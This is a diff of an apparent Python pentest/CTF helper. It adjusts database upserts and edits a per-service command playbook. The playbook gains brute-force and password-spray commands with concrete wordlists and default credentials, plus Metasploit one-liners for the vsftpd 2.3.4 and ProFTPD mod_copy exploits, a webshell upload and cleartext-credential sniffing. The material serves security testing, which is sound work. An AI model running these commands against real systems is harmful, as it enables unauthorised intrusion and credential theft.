@@ -870,15 +870,23 @@ def fetch_hosts() -> list:
     return rows
 
 
-def save_ports(ip: str, rows: list, source: "str | None" = None) -> int:
+def save_ports(ip: str, rows: list, source: "str | None" = None, replace: bool = False) -> int:
     """Upsert open ports for a host by (ip, port, proto). When a scan carried a service
     guess (nmap's port->name table, or -sV later), it's upserted into the services
     table too — kept non-null so the service-detection phase only enriches it.
     ``source='manual'`` tags user-entered rows; a scanned upsert (source=None) never
-    clears an existing tag (COALESCE), so a manual row stays flagged for removal."""
+    clears an existing tag (COALESCE), so a manual row stays flagged for removal.
+    ``replace=True`` (manual add) overwrites the service name/product/version outright —
+    blanks clear the old scanned values — instead of the merge a scan does."""
     if not ip or not rows or _is_self_ip(ip):
         return 0
     now = datetime.now().isoformat(timespec="seconds")
+    # manual add fully replaces the service fields; a scan merges (COALESCE) so -sV enriches.
+    svc_set = ("name = excluded.name, product = excluded.product, version = excluded.version"
+               if replace else
+               "name = COALESCE(excluded.name, name), "
+               "product = COALESCE(excluded.product, product), "
+               "version = COALESCE(excluded.version, version)")
     with _DB_LOCK:
         conn = _db_connect()
         try:
@@ -897,9 +905,7 @@ def save_ports(ip: str, rows: list, source: "str | None" = None) -> int:
                         "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                         "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                         "ON CONFLICT(ip, port, proto) DO UPDATE SET "
-                        "  name     = COALESCE(excluded.name, name), "
-                        "  product  = COALESCE(excluded.product, product), "
-                        "  version  = COALESCE(excluded.version, version), "
+                        f"  {svc_set}, "
                         "  last_seen = excluded.last_seen, "
                         "  source   = COALESCE(excluded.source, source)",
                         (ip, r["port"], r["proto"], svc.get("name"), svc.get("product"),
@@ -953,13 +959,22 @@ def fetch_services(ip: str) -> dict:
     return {(p, pr): (n, prod, ver, cpe) for p, pr, n, prod, ver, cpe in rows}
 
 
-def save_services(ip: str, rows: list, source: "str | None" = None) -> int:
+def save_services(ip: str, rows: list, source: "str | None" = None, replace: bool = False) -> int:
     """Upsert probed service data (-sV) by (ip, port, proto), overwriting the earlier
     port-enum guess with the real name/product/version/cpe. ``source='manual'`` tags
-    user-entered rows; a scanned upsert never clears an existing tag (COALESCE)."""
+    user-entered rows; a scanned upsert never clears an existing tag (COALESCE).
+    ``replace=True`` (manual add) overwrites name/product/version/cpe outright — blanks
+    clear the old scanned values — instead of merging them the way a scan does."""
     if not ip or not rows or _is_self_ip(ip):
         return 0
     now = datetime.now().isoformat(timespec="seconds")
+    set_fields = ("name = excluded.name, product = excluded.product, "
+                  "version = excluded.version, cpe = excluded.cpe"
+                  if replace else
+                  "name = COALESCE(excluded.name, name), "
+                  "product = COALESCE(excluded.product, product), "
+                  "version = COALESCE(excluded.version, version), "
+                  "cpe = COALESCE(excluded.cpe, cpe)")
     with _DB_LOCK:
         conn = _db_connect()
         try:
@@ -968,10 +983,7 @@ def save_services(ip: str, rows: list, source: "str | None" = None) -> int:
                     "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                     "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                     "ON CONFLICT(ip, port, proto) DO UPDATE SET "
-                    "  name     = COALESCE(excluded.name, name), "
-                    "  product  = COALESCE(excluded.product, product), "
-                    "  version  = COALESCE(excluded.version, version), "
-                    "  cpe      = COALESCE(excluded.cpe, cpe), "
+                    f"  {set_fields}, "
                     "  last_seen = excluded.last_seen, "
                     "  source   = COALESCE(excluded.source, source)",
                     (ip, r["port"], r["proto"], r.get("name"), r.get("product"),
@@ -1724,13 +1736,6 @@ _VULN_PORT_FALLBACK = {
     3632: "distcc", 3310: "clamav", 6667: "irc", 6000: "x11", 6001: "x11",
 }
 _TLS_PORTS = {443, 465, 563, 636, 853, 990, 992, 993, 995, 8443}
-# auth-category scripts that only emit output when they actually find a weakness, so
-# any output is a finding (anonymous / empty / default creds, unauth access).
-_AUTH_FINDING = {"ftp-anon", "mysql-empty-password", "ms-sql-empty-password",
-                 "http-default-accounts", "x11-access", "redis-info",
-                 "mongodb-databases", "rsync-list-modules", "snmp-info"}
-
-
 def _vuln_key(name: "str | None", port: int) -> "str | None":
     if name:
         low = name.lower()
@@ -4002,28 +4007,6 @@ _EXPLOIT_STEPS = {
 }
 
 
-# ── phase-5 command playbook (new model) ──────────────────────────────────────
-# Each service maps {step_index → [command, …]}: copy-paste Kali / HTB tooling where the
-# variable parts are <PLACEHOLDERS> the operator fills in. `r <n><letter>` opens a new
-# terminal with the chosen command pre-typed on the prompt (editable, NOT executed) — the
-# operator replaces the placeholders and presses Enter. Everything is a placeholder, even
-# <RHOST>/<RPORT>, so the same line is valid in the read-only catalog and the live host
-# checklist. A service present here renders in command-mode; one absent falls back to the
-# legacy wired-tool checklist (which is being retired step by step).
-_PH = {  # documented placeholder vocabulary — kept here so every service stays consistent
-    "RHOST": "target IP / hostname", "RPORT": "target port", "LHOST": "your IP",
-    "LPORT": "your listener port", "IFACE": "your interface (tun0/eth0)",
-    "DOMAIN": "AD domain (FQDN)", "DC": "domain-controller IP", "USER": "username",
-    "PASS": "password", "NTHASH": "NT hash", "SHARE": "share name", "COMMAND": "command",
-    "USERLIST": "users wordlist", "PASSLIST": "passwords wordlist", "WORDLIST": "wordlist",
-    "LOCALFILE": "local file to upload", "CPASSWORD": "GPP cpassword blob",
-    "PRODUCT": "product name", "VERSION": "version string", "PATH": "URL path",
-    "PARAM": "parameter name", "URL": "full URL", "DB": "database name",
-    "TABLE": "table name", "COMMUNITY": "SNMP community string", "KEYFILE": "SSH private key",
-    "JWT": "JSON Web Token", "EXT": "file extensions", "SIZE": "response size to filter",
-    "TOKEN": "API token", "SID": "Oracle SID", "NODE": "cluster node", "COOKIE": "session cookie",
-    "MODULE": "module / repo name", "EMAIL": "email address", "EXTENSION": "SIP extension",
-}
 _STEP_COMMANDS = {
     "smb": {
         1: [  # Null / guest enumeration
@@ -4054,7 +4037,7 @@ _STEP_COMMANDS = {
         5: [  # Poison LLMNR / NBT-NS → capture NetNTLM
             "sudo responder -I <IFACE> -wv",
             "sudo responder -I <IFACE> -A",
-            "hashcat -m 5600 hashes.txt <WORDLIST>",
+            "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
         ],
         6: [  # NTLM relay (signing not required)
             "nxc smb <RHOST>/24 --gen-relay-list relay-targets.txt",
@@ -4072,9 +4055,9 @@ _STEP_COMMANDS = {
             "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M printnightmare",
         ],
         9: [  # Spray creds & hashes (mind lockout)
-            "nxc smb <RHOST> -u <USERLIST> -p '<PASS>' --continue-on-success",
+            "nxc smb <RHOST> -u /usr/share/seclists/Usernames/Names/names.txt -p '<PASS>' --continue-on-success",
             "nxc smb <RHOST> -u '<USER>' -H <NTHASH>",
-            "kerbrute passwordspray -d <DOMAIN> --dc <DC> <USERLIST> '<PASS>'",
+            "kerbrute passwordspray -d <DOMAIN> --dc <DC> /usr/share/seclists/Usernames/Names/names.txt '<PASS>'",
         ],
         10: [  # Valid creds / hash → shell
             "impacket-psexec '<DOMAIN>/<USER>:<PASS>@<RHOST>'",
@@ -4105,6 +4088,8 @@ _STEP_COMMANDS = {
         ],
         2: [
             "whatweb -a3 http://<RHOST>:<RPORT>/",
+            "nikto -h http://<RHOST>:<RPORT>/ -Tuning b",
+            "wafw00f http://<RHOST>:<RPORT>/",
             "nmap -sV -p<RPORT> --script http-headers,http-title,http-generator <RHOST>",
             "nuclei -u http://<RHOST>:<RPORT>/ -t http/technologies/",
         ],
@@ -4118,7 +4103,10 @@ _STEP_COMMANDS = {
         ],
         5: [
             "curl -sk http://<RHOST>:<RPORT>/ | grep -Ei 'password|api[_-]?key|secret|token|BEGIN'",
-            "curl -sk http://<RHOST>:<RPORT>/main.js | grep -Eo 'https?://[^\" ]+'",
+            "katana -u http://<RHOST>:<RPORT>/ -jc -silent | grep -Ei '\\.js$'",
+            "curl -sk http://<RHOST>:<RPORT>/ | grep -oE 'src=\"[^\"]+\\.js\"'",
+            "linkfinder -i http://<RHOST>:<RPORT>/ -d -o cli",
+            "cewl -d 2 -m 5 -w cewl.txt http://<RHOST>:<RPORT>/",
         ],
         6: [
             "curl -sk http://<RHOST>:<RPORT>/robots.txt",
@@ -4128,16 +4116,16 @@ _STEP_COMMANDS = {
         7: [
             "curl -skI http://<RHOST>:<RPORT>/ | grep -i set-cookie",
             "jwt_tool <JWT>",
-            "hashcat -m 16500 jwt.txt <WORDLIST>",
+            "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt",
         ],
         8: [
-            "ffuf -u http://<RHOST>:<RPORT>/ -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST> -ac",
-            "gobuster vhost -u http://<RHOST>:<RPORT> -w <WORDLIST> --append-domain",
+            "ffuf -u http://<RHOST>:<RPORT>/ -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac",
+            "gobuster vhost -u http://<RHOST>:<RPORT> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain",
         ],
         9: [
-            "feroxbuster -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x php,html,txt",
-            "gobuster dir -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x php,txt,html",
-            "ffuf -u http://<RHOST>:<RPORT>/FUZZ -w <WORDLIST> -e .php,.txt,.html",
+            "feroxbuster -u http://<RHOST>:<RPORT>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt",
+            "gobuster dir -u http://<RHOST>:<RPORT>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html",
+            "ffuf -u http://<RHOST>:<RPORT>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html",
         ],
         10: [
             "git-dumper http://<RHOST>:<RPORT>/.git/ ./loot-git",
@@ -4146,7 +4134,7 @@ _STEP_COMMANDS = {
         ],
         11: [
             "arjun -u http://<RHOST>:<RPORT>/<PATH>",
-            "ffuf -u 'http://<RHOST>:<RPORT>/<PATH>?FUZZ=1' -w <WORDLIST> -fs <SIZE>",
+            "ffuf -u 'http://<RHOST>:<RPORT>/<PATH>?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <SIZE>",
         ],
         12: [
             "wpscan --url http://<RHOST>:<RPORT>/ --enumerate ap,at,u --api-token <TOKEN>",
@@ -4154,18 +4142,19 @@ _STEP_COMMANDS = {
             "joomscan --url http://<RHOST>:<RPORT>/",
         ],
         13: [
-            "hydra -L <USERLIST> -P <PASSLIST> <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=incorrect'",
-            "hydra -L <USERLIST> -P <PASSLIST> -f <RHOST> -s <RPORT> http-get /<PATH>",
+            "nuclei -u http://<RHOST>:<RPORT>/ -t http/default-logins/",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=incorrect'",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f <RHOST> -s <RPORT> http-get /<PATH>",
         ],
         14: [
-            "ffuf -u http://<RHOST>:<RPORT>/<PATH> -X POST -d 'username=admin&password=FUZZ' -w <WORDLIST> -fc 401",
+            "ffuf -u http://<RHOST>:<RPORT>/<PATH> -X POST -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fc 401",
             "# SQLi auth bypass: username=admin'-- -   /   ' or 1=1-- -",
         ],
         15: [
-            "hydra -l <USER> -P <PASSLIST> <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=<PATH>'",
+            "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=<PATH>'",
         ],
         16: [
-            "ffuf -u 'http://<RHOST>:<RPORT>/api/user/FUZZ' -w <WORDLIST>",
+            "ffuf -u 'http://<RHOST>:<RPORT>/api/user/FUZZ' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
             "# swap object IDs / cookies / JWT claims to test broken access control",
         ],
         17: [
@@ -4217,7 +4206,7 @@ _STEP_COMMANDS = {
             "curl -sk http://<RHOST>:5985/wsman -X POST -i",
         ],
         2: [
-            "nxc winrm <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
+            "nxc winrm <RHOST> -u /usr/share/seclists/Usernames/Names/names.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success",
             "nxc winrm <RHOST> -u <USER> -H <NTHASH>",
         ],
         3: [
@@ -4236,24 +4225,31 @@ _STEP_COMMANDS = {
     "ftp": {
         1: [
             "nc -nv <RHOST> <RPORT>",
-            "nmap -sV -p<RPORT> --script ftp-* <RHOST>",
+            "nmap -sV -p<RPORT> --script ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <RHOST>",
+            "openssl s_client -connect <RHOST>:<RPORT> -starttls ftp | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'",
             "searchsploit <PRODUCT> <VERSION>",
+            "# vsftpd 2.3.4 backdoor: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <RHOST>; run'  (USER ends in :) → root shell on :6200)",
         ],
         2: [
+            "nmap -p<RPORT> --script ftp-anon <RHOST>",
             "ftp <RHOST> <RPORT>",
-            "wget -m --no-passive ftp://anonymous:anonymous@<RHOST>:<RPORT>/",
+            "curl -s ftp://anonymous:anonymous@<RHOST>:<RPORT>/ --list-only",
+            "wget -m ftp://anonymous:anonymous@<RHOST>:<RPORT>/",
         ],
         3: [
             "curl -s ftp://<USER>:<PASS>@<RHOST>:<RPORT>/ --list-only",
             "curl -T <LOCALFILE> ftp://<USER>:<PASS>@<RHOST>:<RPORT>/",
         ],
         4: [
-            "hydra -L <USERLIST> -P <PASSLIST> ftp://<RHOST>:<RPORT> -f",
-            "nxc ftp <RHOST> -u <USERLIST> -p <PASSLIST>",
+            "hydra -C <(printf 'admin:admin\\nftp:ftp\\nroot:root\\nuser:user\\nadmin:\\n') ftp://<RHOST>:<RPORT> -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>:<RPORT> -f",
+            "nxc ftp <RHOST> -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/rockyou.txt",
         ],
         5: [
             "curl -T shell.php ftp://<USER>:<PASS>@<RHOST>:<RPORT>/",
-            "# if the FTP root == web root, browse to the uploaded webshell",
+            "# if the FTP root == web root, browse to the uploaded webshell → ?cmd=id",
+            "msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS <RHOST>; set SITEPATH /var/www/html; run'",
+            "# ProFTPD mod_copy CVE-2015-3306 (no auth): SITE CPFR /path/to/shell.php ; SITE CPTO /var/www/html/shell.php",
         ],
         6: [
             "nmap -Pn -b anonymous:anonymous@<RHOST> <TARGET-INTERNAL-IP>",
@@ -4308,7 +4304,7 @@ _STEP_COMMANDS = {
         ],
         2: [
             "# mount as guest / with creds (macOS):  open afp://<USER>:<PASS>@<RHOST>/",
-            "hydra -L <USERLIST> -P <PASSLIST> afp://<RHOST>",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt afp://<RHOST>",
         ],
         3: [
             "# hunt Time Machine backups, .keychain, config files for creds",
@@ -4358,7 +4354,7 @@ _STEP_COMMANDS = {
         ],
         2: [
             "redis-cli -h <RHOST> -p <RPORT> -a <PASS> PING",
-            "hydra -P <PASSLIST> redis://<RHOST>:<RPORT>",
+            "hydra -P /usr/share/wordlists/rockyou.txt redis://<RHOST>:<RPORT>",
         ],
         3: [
             "redis-cli -h <RHOST> -p <RPORT> KEYS '*'",
@@ -4615,7 +4611,8 @@ _STEP_COMMANDS = {
         ],
         2: [
             "mysql -h <RHOST> -u root --skip-ssl   # blank password",
-            "hydra -L <USERLIST> -P <PASSLIST> mysql://<RHOST>:<RPORT>",
+            "hydra -C <(printf 'root:\\nroot:root\\nroot:password\\nadmin:admin\\n') mysql://<RHOST>:<RPORT> -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt mysql://<RHOST>:<RPORT>",
             "nmap -p<RPORT> --script mysql-brute <RHOST>",
         ],
         3: [
@@ -4635,8 +4632,9 @@ _STEP_COMMANDS = {
             "impacket-mssqlclient <USER>:<PASS>@<RHOST> -windows-auth",
         ],
         2: [
-            "nxc mssql <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
-            "nxc mssql <RHOST> -u sa -p ''",
+            "nxc mssql <RHOST> -u sa -p '' sa password Password123 --local-auth --continue-on-success",
+            "hydra -C <(printf 'sa:\\nsa:sa\\nsa:password\\nsa:Password123\\n') mssql://<RHOST> -f",
+            "nxc mssql <RHOST> -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success",
         ],
         3: [
             "nxc mssql <RHOST> -u <USER> -p <PASS> -x 'whoami'",
@@ -4657,7 +4655,7 @@ _STEP_COMMANDS = {
         ],
         2: [
             "PGPASSWORD=postgres psql -h <RHOST> -U postgres -c 'select 1'",
-            "hydra -L <USERLIST> -P <PASSLIST> postgres://<RHOST>:<RPORT>",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt postgres://<RHOST>:<RPORT>",
         ],
         3: [
             "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c '\\l'  # then \\du ; select * from pg_shadow;",
@@ -4725,14 +4723,14 @@ _STEP_COMMANDS = {
     "kerberos": {
         1: [
             "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <RHOST>",
-            "kerbrute userenum -d <DOMAIN> --dc <RHOST> <USERLIST>",
+            "kerbrute userenum -d <DOMAIN> --dc <RHOST> /usr/share/seclists/Usernames/Names/names.txt",
         ],
         2: [
-            "impacket-GetNPUsers <DOMAIN>/ -dc-ip <RHOST> -usersfile <USERLIST> -no-pass",
+            "impacket-GetNPUsers <DOMAIN>/ -dc-ip <RHOST> -usersfile /usr/share/seclists/Usernames/Names/names.txt -no-pass",
             "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <RHOST> -request",
         ],
         3: [
-            "kerbrute passwordspray -d <DOMAIN> --dc <RHOST> <USERLIST> '<PASS>'",
+            "kerbrute passwordspray -d <DOMAIN> --dc <RHOST> /usr/share/seclists/Usernames/Names/names.txt '<PASS>'",
         ],
         4: [
             "# HackTricks Kerberos: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast",
@@ -4796,7 +4794,7 @@ _STEP_COMMANDS = {
             "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <RHOST>; run'",
         ],
         2: [
-            "hashcat -m 7300 ipmi-hashes.txt <WORDLIST>",
+            "hashcat -m 7300 ipmi-hashes.txt /usr/share/wordlists/rockyou.txt",
         ],
         3: [
             "ipmitool -I lanplus -C 0 -H <RHOST> -U root -P '' user list",
@@ -4817,7 +4815,7 @@ _STEP_COMMANDS = {
             "dig version.bind chaos txt @<RHOST>",
         ],
         3: [
-            "dnsrecon -d <DOMAIN> -n <RHOST> -t brt -D <WORDLIST>",
+            "dnsrecon -d <DOMAIN> -n <RHOST> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
             "dnsenum --dnsserver <RHOST> <DOMAIN>",
         ],
         4: [
@@ -4834,8 +4832,8 @@ _STEP_COMMANDS = {
             "searchsploit <PRODUCT> <VERSION>",
         ],
         2: [
-            "smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <RHOST>",
-            "smtp-user-enum -M VRFY -U <USERLIST> -t <RHOST>",
+            "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D <DOMAIN> -t <RHOST>",
+            "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <RHOST>",
         ],
         3: [
             "nmap -p25 --script smtp-open-relay <RHOST>",
@@ -4861,8 +4859,9 @@ _STEP_COMMANDS = {
             "searchsploit <PRODUCT> <VERSION>",
         ],
         2: [
-            "hydra -L <USERLIST> -P <PASSLIST> pop3://<RHOST>",
-            "hydra -L <USERLIST> -P <PASSLIST> imap://<RHOST>",
+            "hydra -C <(printf 'admin:admin\\nroot:root\\nuser:user\\ntest:test\\n') pop3://<RHOST> -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt pop3://<RHOST>",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt imap://<RHOST>",
         ],
         3: [
             "curl -sk 'pop3://<RHOST>' -u '<USER>:<PASS>'   # then RETR n",
@@ -4875,16 +4874,22 @@ _STEP_COMMANDS = {
     "telnet": {
         1: [
             "nc -nv <RHOST> <RPORT>",
-            "nmap -sV -p<RPORT> --script telnet-ntlm-info <RHOST>",
+            "telnet <RHOST> <RPORT>",
+            "nmap -sV -p<RPORT> --script telnet-ntlm-info,telnet-encryption <RHOST>",
+            "searchsploit <PRODUCT> <VERSION>",
         ],
         2: [
-            "hydra -L <USERLIST> -P <PASSLIST> telnet://<RHOST>:<RPORT> -f",
+            "hydra -C <(printf 'root:\\nroot:root\\nadmin:admin\\nadmin:\\n') telnet://<RHOST>:<RPORT> -f",
+            "hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://<RHOST>:<RPORT> -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt telnet://<RHOST>:<RPORT> -f -t 4",
         ],
         3: [
-            "# passive: sniff cleartext creds on the wire (tcpdump / wireshark)",
+            "sudo tcpdump -i <IFACE> -A 'tcp port <RPORT> and host <RHOST>'",
+            "# then wireshark → Follow TCP Stream to read the cleartext user/pass",
         ],
         4: [
             "# HackTricks Telnet: https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet",
+            "searchsploit <PRODUCT>",
         ],
     },
     "irc": {
@@ -4907,7 +4912,7 @@ _STEP_COMMANDS = {
             "nmap -p3389 --script rdp-ntlm-info,rdp-vuln-ms12-020 <RHOST>",
         ],
         2: [
-            "nxc rdp <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
+            "nxc rdp <RHOST> -u /usr/share/seclists/Usernames/Names/names.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success",
             "nxc rdp <RHOST> -u <USER> -H <NTHASH>",
         ],
         3: [
@@ -4919,8 +4924,8 @@ _STEP_COMMANDS = {
             "nmap -p<RPORT> --script vnc-info,realvnc-auth-bypass <RHOST>",
         ],
         2: [
-            "nxc vnc <RHOST> -p <PASSLIST>",
-            "hydra -P <PASSLIST> vnc://<RHOST>:<RPORT>",
+            "nxc vnc <RHOST> -p /usr/share/wordlists/rockyou.txt",
+            "hydra -P /usr/share/wordlists/rockyou.txt vnc://<RHOST>:<RPORT>",
         ],
         3: [
             "vncviewer <RHOST>::<RPORT>",
@@ -4933,7 +4938,8 @@ _STEP_COMMANDS = {
             "searchsploit <PRODUCT> <VERSION>",
         ],
         2: [
-            "hydra -L <USERLIST> -P <PASSLIST> ssh://<RHOST>:<RPORT> -t 4 -f",
+            "hydra -C <(printf 'root:root\\nroot:toor\\nadmin:admin\\nuser:user\\n') ssh://<RHOST>:<RPORT> -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>:<RPORT> -t 4 -f",
             "ssh -i <KEYFILE> <USER>@<RHOST> -p <RPORT>",
         ],
         3: [
@@ -5022,7 +5028,7 @@ _STEP_COMMANDS = {
             "finger root@<RHOST>",
         ],
         2: [
-            "finger-user-enum.pl -U <USERLIST> -t <RHOST>",
+            "finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>",
         ],
         3: [
             "# HackTricks Finger: https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger",
@@ -5060,7 +5066,7 @@ _STEP_COMMANDS = {
             "svwar -m INVITE -e 100-999 <RHOST>",
         ],
         2: [
-            "svcrack -u <EXTENSION> -d <PASSLIST> <RHOST>",
+            "svcrack -u <EXTENSION> -d /usr/share/wordlists/rockyou.txt <RHOST>",
         ],
         3: [
             "# sniff SIP creds; test toll fraud / call interception",
@@ -5196,171 +5202,15 @@ def _step_parts(step) -> tuple:
     return step, None
 
 
-_SPLOIT_INTERESTING = {   # whatweb plugin names worth an Exploit-DB lookup (when versioned)
-    "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
-    "php", "wordpress", "drupal", "joomla", "magento", "mediawiki", "typo3", "moodle",
-    "jenkins", "jira", "gitlab", "phpmyadmin", "openssl", "openssh",
-}
-
-
-_SECRET_PATTERNS = [   # conservative set — fixed-format keys first, then noisier assignments
-    ("aws-key",     r"AKIA[0-9A-Z]{16}"),
-    ("google-api",  r"AIza[0-9A-Za-z_\-]{35}"),
-    ("slack-token", r"xox[baprs]-[0-9A-Za-z-]{10,}"),
-    ("jwt",         r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),
-    ("bearer",      r"[Aa]uthorization[\"']?\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._\-]+"),
-    ("private-key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
-    ("assignment",  r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd)"
-                    r"[\"']?\s*[:=]\s*[\"'][^\"']{6,60}[\"']"),
-]
-
-
-_ERROR_TECH = [   # framework signatures that leak from an error/404 page body
-    ("Werkzeug/Flask", r"Werkzeug|Traceback \(most recent call last\)"),
-    ("Django",         r"Django|You're seeing this error because"),
-    ("Laravel/Symfony", r"Laravel|Symfony|Whoops"),
-    ("ASP.NET",        r"ASP\.NET|Server Error in .*? Application"),
-    ("Java/Tomcat",    r"Apache Tomcat|javax\.servlet|java\.lang\."),
-    ("Express",        r"Cannot (?:GET|POST) /|X-Powered-By: Express"),
-    ("Rails",          r"Ruby on Rails|Action Controller"),
-    ("PHP",            r"Fatal error:|Warning:.*?on line|<b>Notice</b>"),
-]
-
-
-_JWT_WEAK_SECRETS = [   # small curated list — a trivial-secret check, not a full crack (hashcat)
-    "secret", "password", "changeme", "admin", "jwt", "key", "private", "your-256-bit-secret",
-    "your_jwt_secret", "supersecret", "s3cr3t", "secretkey", "secret123", "password123",
-    "12345678", "qwerty", "test", "dev", "default", "token", "mysecret", "jwtsecret",
-    "jsonwebtoken", "shhhh", "topsecret", "letmein", "root", "pass", "hmac", "signature",
-    "verysecret", "sign", "secretpassword", "iloveyou", "abc123", "welcome", "ChangeMe!",
-]
-
-
-# vhost/subdomain wordlists, best first — the runner uses the first that exists on disk,
-# else a small builtin fallback so the tool always has something to sweep.
-_VHOST_WORDLISTS = [
-    ("seclists top-20000",     "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"),
-    ("seclists top-5000",      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
-    ("seclists bitquark-100k", "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
-    ("seclists n0kovo-small",  "/usr/share/seclists/Discovery/DNS/n0kovo_subdomains/n0kovo_subdomains_small.txt"),
-    ("amass top-20000",        "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"),
-    ("amass top-5000",         "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"),
-    ("dnsmap",                 "/usr/share/wordlists/dnsmap.txt"),
-]
-_VHOST_BUILTIN = [   # ultimate fallback: common internal / CTF vhost labels
-    "www", "dev", "development", "staging", "stage", "test", "testing", "uat", "qa",
-    "admin", "administrator", "api", "api-dev", "internal", "intranet", "corp", "portal",
-    "dashboard", "app", "apps", "web", "webmail", "mail", "smtp", "vpn", "git", "gitlab",
-    "jenkins", "jira", "confluence", "grafana", "kibana", "prometheus", "db", "database",
-    "phpmyadmin", "backup", "old", "beta", "demo", "static", "cdn", "files", "upload",
-    "storage", "auth", "sso", "login", "secure", "monitor", "status", "support",
-]
-_VHOST_DEADLINE = 600         # s — hard wall-clock cap across every pass
-_VHOST_THREADS = 30
-_VHOST_REQ_TIMEOUT = 5
-_VHOST_MAX_CANDIDATES = 25000  # sanity cap on words per pass
-
-
-# directory/file wordlists for content discovery, best first — each entry may list several
-# files (merged if present); the runner uses the first entry that has any file on disk.
-_DIRB_WORDLISTS = [
-    ("seclists raft-medium", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
-                              "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"]),
-    ("seclists dirlist-2.3-medium", ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"]),
-    ("seclists common", ["/usr/share/seclists/Discovery/Web-Content/common.txt"]),
-    ("dirb common", ["/usr/share/wordlists/dirb/common.txt"]),
-    ("dirb big", ["/usr/share/wordlists/dirb/big.txt"]),
-    ("dirbuster small", ["/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]),
-]
-_DIRB_BUILTIN = [   # ultimate fallback: common dirs / files worth a look
